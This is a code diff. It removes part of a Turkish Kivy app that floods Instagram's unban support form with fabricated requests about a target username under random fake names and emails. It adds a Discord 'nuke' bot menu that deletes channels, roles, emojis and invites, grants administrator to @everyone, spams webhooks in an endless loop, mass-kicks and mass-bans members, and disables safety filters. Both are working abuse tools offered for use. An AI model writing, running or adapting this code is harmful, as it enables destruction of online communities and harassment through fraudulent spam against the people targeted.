+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            for i in range(num_roles):
+                                await server.create_role(name=role_name)
+                                print(f"{Fore.GREEN} [+] Role '{role_name}' created successfully.")
+                            print(f"{Fore.GREEN} [+] Successfully created {num_roles} roles.")
+                            time.sleep(3)
+                            separate_option = '3'
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An error occurred while creating roles: {e}")
+                            
+                elif separate_option == '3':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
 
-        # --- Input Alanı (Sadece Kullanıcı Adı) ---
-        input_layout = BoxLayout(orientation='vertical', spacing=dp(5), size_hint_y=None, height=dp(60)) # Yükseklik ayarlandı
-        input_layout.add_widget(Label(text="Instagram Kullanıcı Adı:", size_hint_y=None, height=dp(18), font_size='13sp', halign='left', text_size=(Window.width - dp(20), None), color=COLOR_LIGHT_GRAY_RGBA))
-        self.username_input = TextInput(hint_text='@kullaniciadi', multiline=False, size_hint_y=None, height=dp(35), font_size='14sp', foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1))
-        input_layout.add_widget(self.username_input)
-        self.layout.add_widget(input_layout)
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        for role in server.roles:
+                            if role != server.default_role:
+                                try:
+                                    await role.delete()
+                                    print(f"{Fore.YELLOW} [+] Role '{role.name}' deleted successfully.")
+                                except discord.Forbidden:
+                                    print(f"{Fore.RED} [!] Bot doesn't have permission to delete roles on this server.")
+                                except Exception as e:
+                                    print(f"{Fore.RED} [!] An error occurred while deleting role '{role.name}': {e}")
 
-        # --- Başlat/Durdur Butonu ---
-        self.submit_button = Button(
-            text='Spam Başlat', on_press=self.toggle_spamming, size_hint_y=None, height=dp(45),
-            font_size='16sp', background_color=COLOR_INFO_RGBA, background_normal='', color=COLOR_WHITE_RGBA)
-        self.layout.add_widget(self.submit_button)
+                elif separate_option == '4':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
 
-        # --- Durum Etiketi ---
-        self.status_label = Label(
-            text=self.status_text, size_hint_y=None, height=dp(50), # Yükseklik ayarlandı
-            markup=True, color=COLOR_LIGHT_GRAY_RGBA, halign='center', valign='top', font_size='12sp', # Küçültüldü
-            text_size=(Window.width - dp(20), None)
-        )
-        self.bind(status_text=self.status_label.setter('text'))
-        self.layout.add_widget(self.status_label)
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            await change_permissions(server, True)
+                            print(f"{Fore.GREEN} [+] Successfully granted administrator permissions to @everyone.")
+                            time.sleep(3)
+                            option_3_selected = True
+                            separate_option = '3'
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An error occurred while granting administrator permissions: {e}")
 
-        self.layout.add_widget(Label(size_hint_y=1))
-        self.add_widget(self.layout)
-        self._unban_thread = None
-        self._stop_unban = threading.Event()
+                elif separate_option == '5':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
 
-    # --- toggle_spamming, start_spamming, stop_spamming, run_unban_spam ---
-    # --- metotları önceki koddan AYNI ŞEKİLDE alınacak ---
-    def go_back(self, instance):
-        self.stop_spamming()
-        self.manager.transition.direction = 'right'
-        self.manager.current = 'menu'
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            await server.edit(default_notifications=discord.NotificationLevel.all_messages)
+                            print(f"{Fore.GREEN} [+] Successfully changed server notification settings to all messages.")
+                            time.sleep(3)
+                            option_3_selected = True
+                            separate_option = '3'
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An error occurred while changing server notification settings: {e}")
 
-    def toggle_spamming(self, instance):
-        if self.is_spamming: self.stop_spamming()
-        else: self.start_spamming()
+                elif separate_option == '6':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
 
-    def start_spamming(self):
-        if self._unban_thread and self._unban_thread.is_alive(): return
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            channel_tasks = []
 
-        target_username = self.username_input.text.strip()
-        if not target_username:
-            self.update_status(f"[color={COLOR_BAD_HEX}]Hata: Kullanıcı Adı girin.[/color]")
-            return
-        if '@' not in target_username: target_username = '@' + target_username
+                            for channel in server.text_channels:
+                                try:
+                                    await channel.delete()
+                                    print(f"{Fore.GREEN} [+] Text channel '{channel.name}' deleted successfully.")
+                                except discord.HTTPException as e:
+                                    if e.code == 429:
+                                        print(f"{Fore.RED} [!] Rate limited. Trying again after cooldown.")
+                                    else:
+                                        print(f"{Fore.RED} [!] An error occurred while deleting text channel '{channel.name}': {e}")
 
-        if hasattr(self, '_stop_unban'): self._stop_unban.set()
-        self._stop_unban = threading.Event()
+                            for channel in server.voice_channels:
+                                try:
+                                    await channel.delete()
+                                    print(f"{Fore.GREEN} [+] Voice channel '{channel.name}' deleted successfully.")
+                                except discord.HTTPException as e:
+                                    if e.code == 429:
+                                        print(f"{Fore.RED} [!] Rate limited. Trying again after cooldown.")
+                                    else:
+                                        print(f"{Fore.RED} [!] An error occurred while deleting voice channel '{channel.name}': {e}")
 
-        self.is_spamming = True
-        self.submit_button.text = "Durdur"
-        self.submit_button.background_color = COLOR_BAD_RGBA
-        self.request_count = 0; self.success_count = 0; self.fail_count = 0
-        self.update_status(f"[color={COLOR_INFO_HEX}]Spam başlatılıyor ({target_username})...[/color]")
+                            for category in server.categories:
+                                try:
+                                    await category.delete()
+                                    print(f"{Fore.GREEN} [+] Category '{category.name}' deleted successfully.")
+                                except discord.HTTPException as e:
+                                    if e.code == 429:
+                                        print(f"{Fore.RED} [!] Rate limited. Trying again after cooldown.")
+                                    else:
+                                        print(f"{Fore.RED} [!] An error occurred while deleting category '{category.name}': {e}")
 
-        self._unban_thread = threading.Thread(target=self.run_unban_spam, args=(target_username, self._stop_unban))
-        self._unban_thread.daemon = True
-        self._unban_thread.start()
-
-    def stop_spamming(self):
-        if self._unban_thread and self._unban_thread.is_alive():
-            if hasattr(self, '_stop_unban'): self._stop_unban.set()
-            # Durduruluyor mesajını update_spam_stats içinde gösterebiliriz
-            # self.update_status(f"[color={COLOR_WARNING_HEX}]Spam durduruluyor...")
-        else:
-            self.enable_submit_button()
-
-    @mainthread
-    def update_status(self, text):
-        self.status_text = text
-
-    @mainthread
-    def update_spam_stats(self, success=None, error_msg=None):
-        self.request_count += 1
-        status_line = ""
-        if success is True:
-            self.success_count += 1
-            status_line = f"[color={COLOR_HIT_HEX}]Başarılı İstek[/color]"
-        elif success is False:
-            self.fail_count += 1
-            status_line = f"[color={COLOR_BAD_HEX}]Başarısız İstek[/color]"
-            if error_msg: status_line += f" ({error_msg})"
-        else:
-             self.fail_count += 1
-             status_line = f"[color={COLOR_WARNING_HEX}]Hata: {error_msg}[/color]"
-
-        self.status_text = (f"Gönderilen: {self.request_count} | "
-                            f"[color={COLOR_HIT_HEX}]Başarılı: {self.success_count}[/color] | "
-                            f"[color={COLOR_BAD_HEX}]Başarısız: {self.fail_count}[/color]\n"
-                            f"{status_line}")
-
-
-    @mainthread
-    def enable_submit_button(self):
-        self.is_spamming = False
-        self.submit_button.text = 'Spam Başlat'
-        self.submit_button.background_color = COLOR_INFO_RGBA
-        self._unban_thread = None
-        # Durunca son durumu gösterelim
-        if self.request_count > 0: # Eğer hiç başlamadıysa mesajı değiştirme
-             self.update_status(f"[color={COLOR_INFO_HEX}]Spam Durduruldu.[/color]\n" + self.status_label.text.split('\n')[0])
+                            print(f"{Fore.GREEN} [+] Successfully deleted all channels and categories.")
+                            time.sleep(3)
+                            separate_option = '3'
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An error occurred while deleting channels and categories: {e}")
 
 
-    def run_unban_spam(self, target_username, stop_event):
-         # --- BU KISIM ÖNCEKİ KODDAKİ run_unban_spam ---
-         # --- İLE TAMAMEN AYNI OLACAK ---
-        while not stop_event.is_set():
-            try:
-                araf_4 = random.choice(araf_1); araf_5 = random.choice(araf_2)
-                araf_6 = ''.join(random.choices(string.digits, k=3))
-                araf_7 = f"{araf_4.lower()}.{araf_5.lower()}{araf_6}@gmail.com"
-                araf_8 = f"Hello Dear Instagram Team. I have been with you since 2015 with my {target_username} account... Best regards, Dear Instagram Team." # Kısaltılabilir
-                encoded_description = quote(araf_8)
-                araf_11_payload_string = (f"jazoest=2925&lsd={araf_10_headers.get('x-fb-lsd','AVqg6XJgpG8')}&name={quote(araf_4)}%20{quote(araf_5)}&email={quote(araf_7)}&description={encoded_description}&access_before=Yes&support_form_id={UNBAN_FORM_ID}&support_form_locale_id=en_US&support_form_hidden_fields=%7B%7D&support_form_fact_false_fields=[]&__user=0&__a=1&__req=4&__hs=20141.BP%3ADEFAULT.2.0...0&dpr=1&__ccg=EXCELLENT&__rev=1020321434&__s=9wxzvd%3Aazoihk%3Au9053k&__hsi=7474304979465981918&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU6C7UW7oowMxW0DUeU1nEhwem0nCq1ewcG0RU2Cwooa81VohwnU1e42C0sy0ny0RE2Jw8W1uw75w9O0h-0Lo6-0uS0ue1TwmU3yw&__csr=&__spin_r=1020321434&__spin_b=trunk&__spin_t=1740247239&__jssesw=1")
-                araf_12_data = araf_11_payload_string.encode('utf-8')
-                response = requests.post(UNBAN_FORM_URL, cookies=araf_9_cookies, headers=araf_10_headers, data=araf_12_data, timeout=15) # Timeout kısa
-                response.raise_for_status()
+                elif separate_option == '7':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    text_channel_amount = int(input(f"{Fore.GREEN} [?] Enter the number of text channels to create: \n #> "))
+                    voice_channel_amount = int(input(f"{Fore.GREEN} [?] Enter the number of voice channels to create: \n #> "))
+                    channel_name = input(f"{Fore.GREEN} [?] Enter the base name for channels: \n #> ")
 
-                # Başarı kontrolü hala çok belirsiz, orijinal koddaki basit kontrole devam edelim
-                if "Form submitted successfully" in response.text: # Muhtemelen çalışmayacak
-                    self.update_spam_stats(success=True)
-                else:
-                    response_preview = response.text[:40].replace('\n', ' ')
-                    self.update_spam_stats(success=False, error_msg=f"Yanıt: {response_preview}...")
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            channel_tasks = []
 
-            except requests.exceptions.Timeout: self.update_spam_stats(error_msg="Timeout")
-            except requests.exceptions.HTTPError as e: self.update_spam_stats(error_msg=f"HTTP {e.response.status_code}")
-            except requests.exceptions.RequestException: self.update_spam_stats(error_msg="Bağlantı Hatası"); time.sleep(5) # Bağlantı hatasında bekle
-            except Exception as e: self.update_spam_stats(error_msg=f"Hata: {str(e)[:20]}")
+                            for i in range(1, text_channel_amount + 1):
+                                new_channel_name = f"{channel_name}-net-{i}"
+                                channel_task = asyncio.ensure_future(server.create_text_channel(new_channel_name))
+                                channel_tasks.append(channel_task)
 
-            if not stop_event.is_set():
-                 try:
-                      if stop_event.wait(timeout=4): break # 4 saniye bekle veya durdurulursa çık
-                 except Exception: time.sleep(4)
+                            for i in range(1, voice_channel_amount + 1):
+                                new_channel_name = f"{channel_name}-net-{i}"
+                                channel_task = asyncio.ensure_future(server.create_voice_channel(new_channel_name))
+                                channel_tasks.append(channel_task)
 
-        self.enable_submit_button()
+                            await asyncio.gather(*channel_tasks)
+
+                            print(f"{Fore.GREEN} [+] Successfully created {text_channel_amount} text channels and {voice_channel_amount} voice channels.")
+                            time.sleep(3)
+                            separate_option = '3'
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An error occurred while creating channels: {e}")
+
+                elif separate_option == '9':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    message = input(f"{Fore.GREEN} [?] Enter the message you want to spam: \n #> ")
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        existing_webhooks = []
+                        for channel in server.text_channels:
+                            webhooks = await channel.webhooks()
+                            if webhooks:
+                                existing_webhooks.extend(webhooks)
+
+                        webhooks = existing_webhooks.copy()
+                        for channel in server.text_channels:
+                            if not any(webhook.channel == channel for webhook in existing_webhooks):
+                                webhook_task = create_channel_webhook(channel)
+                                if webhook_task:
+                                    webhooks.append(await webhook_task)
+
+                        while True:
+                            spam_tasks = [webhook.send(message) for webhook in webhooks]
+                            await asyncio.gather(*spam_tasks)
+
+                elif separate_option == '10':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        for member in server.members:
+                            try:
+                                if member != client.user:
+                                    await member.kick()
+                                    print(f"{Fore.GREEN} [+] Kicked {member.name} from the server.")
+                            except discord.Forbidden:
+                                print(f"{Fore.RED} [!] Bot doesn't have permission to kick this member.")
+                            except Exception as e:
+                                print(f"{Fore.RED} [!] An error occurred while kicking {member.name}: {e}")
+
+                elif separate_option == '11':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        for member in server.members:
+                            try:
+                                if member != client.user:
+                                    await member.ban()
+                                    print(f"{Fore.GREEN} [+] Banned {member.name} from the server.")
+                            except discord.Forbidden:
+                                print(f"{Fore.RED} [!] Bot doesn't have permission to ban this member.")
+                            except Exception as e:
+                                print(f"{Fore.RED} [!] An error occurred while banning {member.name}: {e}")
+
+                elif separate_option == '12':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        banned_users = await server.bans()
+                        for entry in banned_users:
+                            user = entry.user
+                            try:
+                                await server.unban(user)
+                                print(f"{Fore.GREEN} [+] Unbanned {user.name} from the server.")
+                            except discord.Forbidden:
+                                print(f"{Fore.RED} [!] Bot doesn't have permission to unban this member.")
+                            except Exception as e:
+                                print(f"{Fore.RED} [!] An error occurred while unbanning {user.name}: {e}")
+
+                elif separate_option == '25':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    mode = input(f"{Fore.GREEN} [?] Do you want to create threads on every existing channel? (yes/no): \n #> ").lower()
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            if mode == 'yes':
+                                channels = [channel for channel in server.channels if isinstance(channel, discord.TextChannel)]
+                            elif mode == 'no':
+                                channel_id = int(input(f"{Fore.GREEN} [?] Enter the channel ID to create threads: \n #> "))
+                                channel = server.get_channel(channel_id)
+                                if channel is None or not isinstance(channel, discord.TextChannel):
+                                    print(f"{Fore.RED} [!] Channel not found or not a text channel.")
+                                    continue
+                                channels = [channel]
+                            else:
+                                print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
+                                continue
+
+                            for channel in channels:
+                                if len(channels) == 1:
+                                    thread_count = int(input(f"{Fore.GREEN} [?] How many threads do you want to create in channel '{channel.name}'? \n #> "))
+                                else:
+                                    thread_count = 10
+                                
+                                for i in range(thread_count):
+                                    thread_name = f"Spam Thread {i+1}"
+                                    try:
+                                        thread = await channel.create_thread(name=thread_name)
+                                        print(f"{Fore.GREEN} [+] Successfully created thread '{thread_name}' in channel '{channel.name}'.")
+                                    except discord.HTTPException as e:
+                                        print(f"{Fore.RED} [!] An error occurred while creating thread '{thread_name}' in channel '{channel.name}': {e.text}")
+
+                            print(f"{Fore.GREEN} [+] Successfully created all threads.")
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An error occurred while creating threads: {e}")
+
+                elif separate_option == '13':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    new_name = input(f"{Fore.GREEN} [?] Enter the new server name: \n #> ")
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            await server.edit(name=new_name)
+                            print(f"{Fore.GREEN} [+] Server name changed successfully to '{new_name}'.")
+                        except discord.Forbidden:
+                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to change the server name.")
+                        except discord.HTTPException as e:
+                            print(f"{Fore.RED} [!] An error occurred while changing server name: {e.text}")
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")
+
+                elif separate_option == '14':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    image_url = input(f"{Fore.GREEN} [?] Enter the image URL: \n #> ")
+
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            async with aiohttp.ClientSession() as session:
+                                async with session.get(image_url) as resp:
+                                    if resp.status == 200:
+                                        image_data = await resp.read()
+                                        await server.edit(icon=image_data)
+                                        print(f"{Fore.GREEN} [+] Server picture changed successfully.")
+                                    else:
+                                        print(f"{Fore.RED} [!] Failed to fetch image. Status code: {resp.status}")
+                        except discord.Forbidden:
+                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to change the server picture.")
+                        except discord.HTTPException as e:
+                            print(f"{Fore.RED} [!] An error occurred while changing server picture: {e.text}")
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")
+
+                elif separate_option == '15':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            async with aiohttp.ClientSession() as session:
+                                tasks = []
+                                for emoji in server.emojis:
+                                    tasks.append(emoji.delete())
+                                    print(f"{Fore.GREEN} [+] Emoji '{emoji.name}' deleted successfully")
+                                await asyncio.gather(*tasks)
+                        except discord.Forbidden:
+                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to delete emojis.")
+                        except discord.HTTPException as e:
+                            print(f"{Fore.RED} [!] An error occurred while deleting emojis: {e}")
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")
 
 
-# --- Kivy Uygulaması ---
-class InstaToolApp(App):
-    def build(self):
-        # Arkaplan rengi (isteğe bağlı)
-        Window.clearcolor = get_color_from_hex("#1e272e") # Biraz daha koyu gri-mavi
+                elif separate_option == '16':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    image_urls = input(f"{Fore.GREEN} [?] Enter image URLs separated by commas: \n #> ").split(',')
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        try:
+                            async with aiohttp.ClientSession() as session:
+                                tasks = []
+                                for image_url in image_urls:
+                                    async with session.get(image_url) as resp:
+                                        if resp.status == 200:
+                                            image_data = await resp.read()
+                                            for _ in range(50):
+                                                tasks.append(server.create_custom_emoji(name=image_url.split('/')[-1].split('.')[0], image=image_data))
+                                            print(f"{Fore.GREEN} [+] Emojis created successfully from: {image_url}")
+                                        else:
+                                            print(f"{Fore.RED} [!] Failed to fetch image from: {image_url}. Status code: {resp.status}")
+                                await asyncio.gather(*tasks)
+                        except discord.Forbidden:
+                            print(f"{Fore.RED} [!] Permission denied: You do not have permission to create emojis.")
+                        except discord.HTTPException as e:
+                            print(f"{Fore.RED} [!] An error occurred while creating emojis: {e}")
+                        except Exception as e:
+                            print(f"{Fore.RED} [!] An unexpected error occurred: {e}")
 
-        sm = ScreenManager(transition=SlideTransition(duration=0.2)) # Geçiş süresini kısalttık
-        sm.add_widget(MenuScreen(name='menu'))
-        sm.add_widget(TrendyolCheckerScreen(name='trendyol_checker')) # Yeni ekran eklendi
-        sm.add_widget(InstaCheckerScreen(name='insta_checker'))   # Instagram checker ekranı
-        sm.add_widget(UnbanScreen(name='unban'))                 # Spam ekranı
-        return sm
+                elif separate_option == '17':
+                    print("\033[91m Soundboard features aren't integrated yet. Join the Discord for further Information.\033[0m")
 
-if __name__ == '__main__':
-    InstaToolApp().run()
+                elif separate_option == '18':
+                    print("\033[91m Soundboard features aren't integrated yet. Join the Discord for further Information.\033[0m")
+
+                elif separate_option == '19':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                        return
+
+                    while True:
+                        invites = await server.invites()
+                        if not invites:
+                            print(f"{Fore.GREEN} [+] All invites deleted.")
+                            break
+                        
+                        for invite in invites:
+                            try:
+                                await invite.delete(reason="Deleting all invites")
+                                print(f"{Fore.GREEN} [+] Successfully deleted invite: {invite.code}")
+                            except discord.Forbidden:
+                                print(f"{Fore.RED} [!] Permission denied: You do not have permission to delete invites.")
+                            except discord.HTTPException as e:
+                                print(f"{Fore.RED} [!] An error occurred while deleting invite: {e}")
+
+
+                elif separate_option == '20':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                        return
+
+                    num_invites = int(input(f"{Fore.GREEN} [?] How many invites to spam?\n #> "))
+                    try:
+                        invites = await asyncio.gather(*[server.text_channels[0].create_invite(max_age=0, max_uses=0) for _ in range(num_invites)])
+                        for invite in invites:
+                            print(f"{Fore.GREEN} [+] Successfully created invite: {invite.url}")
+                    except discord.Forbidden:
+                        print(f"{Fore.RED} [!] Permission denied: You do not have permission to create invites.")
+                    except discord.HTTPException as e:
+                        print(f"{Fore.RED} [!] An error occurred while creating invite: {e}")
+
+                elif separate_option == '21':
+                                        print("\033[91m The pause invites feature isn't integrated yet. Join the Discord for further Information.\033[0m")
+
+                elif separate_option == '22':
+                                        print("\033[91m The auto-mod deactivation feature will come out soon! Join the Discord for further Information.\033[0m")
+
+                elif separate_option == '23':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                        return
+
+                    try:
+                        await server.edit(
+                            default_notifications=discord.NotificationLevel.all_messages,
+                            explicit_content_filter=discord.ContentFilter.disabled,
+                            verification_level=discord.VerificationLevel.low,
+                            community=False
+                        )
+                        print(f"{Fore.GREEN} [+] Community deactivated.")
+                    except discord.Forbidden:
+                        print(f"{Fore.RED} [!] Permission denied: You do not have permission to edit server settings.")
+                    except discord.HTTPException as e:
+                        print(f"{Fore.RED} [!] An error occurred while deactivating community: {e}")
+
+                elif separate_option == '24':
+                                        print("\033[91m Only the deactivations is working atm.\033[0m")
+
+
+        if not option_3_selected:
+            await main()
+
+    await client.start(token)
+
+asyncio.run(main())
